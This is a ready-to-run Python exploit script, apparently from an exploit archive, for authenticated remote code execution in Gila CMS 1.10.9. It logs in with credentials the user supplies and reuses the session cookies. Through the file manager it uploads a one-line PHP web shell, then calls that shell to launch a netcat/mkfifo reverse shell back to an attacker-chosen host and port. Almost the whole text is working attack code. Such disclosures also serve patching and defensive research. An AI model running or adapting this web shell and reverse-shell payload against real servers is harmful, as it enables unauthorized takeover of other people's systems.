# Exploit Title: Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 05-07-2023
# Exploit Author: Omer Shaik (unknown_exploit)
# Vendor Homepage: https://gilacms.com/
# Software Link: https://github.com/GilaCMS/gila/
# Version: Gila 1.10.9
# Tested on: Linux

import requests
from termcolor import colored
from urllib.parse import urlparse

# Print ASCII art
ascii_art = """
 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗  
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝  
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝

                              by Unknown_Exploit
"""

print(colored(ascii_art, "green"))

# Prompt user for target URL
target_url = input("Enter the target login URL (e.g., http://example.com/admin/): ")

# Extract domain from target URL
parsed_url = urlparse(target_url)
domain = parsed_url.netloc
target_url_2 = f"http://{domain}/"

# Prompt user for login credentials
username = input("Enter the email: ")
password = input("Enter the password: ")

# Create a session and perform login
session = requests.Session()
login_payload = {
    'action': 'login',
    'username': username,
    'password': password
}
response = session.post(target_url, data=login_payload)
cookie = response.cookies.get_dict()
var1 = cookie['PHPSESSID']
var2 = cookie['GSESSIONID']

# Prompt user for local IP and port
lhost = input("Enter the local IP (LHOST): ")
lport = input("Enter the local port (LPORT): ")

# Construct the payload
payload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{lhost}+{lport}+>/tmp/f"
payload_url = f"{target_url_2}tmp/shell.php7?cmd={payload}"

# Perform file upload using POST request
upload_url = f"{target_url_2}fm/upload"
upload_headers = {
    "Host": domain,
    "Content-Length": "424",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynKy5BIIJQcZC80i2",
    "Accept": "*/*",
    "Origin": target_url_2,
    "Referer": f"{target_url_2}admin/fm?f=tmp/.htaccess",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": f"PHPSESSID={var1}; GSESSIONID={var2}",
    "Connection": "close"
}
upload_data = f'''
------WebKitFormBoundarynKy5BIIJQcZC80i2
Content-Disposition: form-data; name="uploadfiles"; filename="shell.php7"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundarynKy5BIIJQcZC80i2
Content-Disposition: form-data; name="path"

tmp
------WebKitFormBoundarynKy5BIIJQcZC80i2
Content-Disposition: form-data; name="g_response"

content
------WebKitFormBoundarynKy5BIIJQcZC80i2--
'''

upload_response = session.post(upload_url, headers=upload_headers, data=upload_data)

if upload_response.status_code == 200:
    print("File uploaded successfully.")
    # Execute payload
    response = session.get(payload_url)
    print("Payload executed successfully.")
else:
    print("Error uploading the file:", upload_response.text)